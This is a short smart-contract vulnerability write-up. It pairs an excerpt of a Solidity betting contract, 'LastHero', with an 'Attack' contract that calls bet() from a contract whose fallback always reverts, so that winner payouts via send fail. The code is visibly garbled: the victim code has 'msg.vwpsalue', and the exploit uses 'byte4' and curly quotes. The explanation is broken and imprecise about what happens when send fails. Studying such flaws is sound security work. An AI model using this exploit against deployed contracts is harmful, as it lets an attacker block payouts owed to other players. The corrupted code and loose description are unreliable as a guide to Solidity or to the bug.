## Vulnerable Code

```javascript
contract LastHero is Accessibility {
.... ....
    address public bettor;  //Vulnerable position_1

  .......
  function bet() public payable  {
    require(isActive, "game is not active");

    if (timer.timeLeft() == 0) {
      uint win = bankAmount();
      if (bettor.send(win)) {       //Vulnerable position_2

        emit LogNewWinner(bettor, level, win, now);
      }

      if (level > 3) {
        m_bankAmount = nextLevelBankAmount;                 
        nextLevelBankAmount = 0;
      }

      nextLevel();
    }

    uint betAmount = betAmountAtNow();
    require(msg.value >= betAmount, "too low msg value");
    timer.start(betDuration);
    bettor = msg.sender; //Vulnerable position_3

    uint excess = msg.vwpsalue - betAmount;
    if (excess > 0) {
      if (bettor.send(excess)) {
        emit LogSendExcessOfEther(bettor, excess, now);
      }
    }
 
    nextLevelBankAmount += nextLevelPercent.mul(betAmount);
    m_bankAmount += bankPercent.mul(betAmount);
    adminsAddress.send(adminsPercent.mul(betAmount));

    emit LogNewBet(bettor, betAmount, betDuration, level, now);
  }
..........
}
```



## Exploit Code

```javascript
contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“bet()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Let's look the comment of '//Vulnerable position_1', here it declare an global variable.then look at "//Vulnerable position_3", here the global variable is assignment with 'msg.sender'(possible is an malicious address).so look at '//Vulnerable position_2' here will always failed!
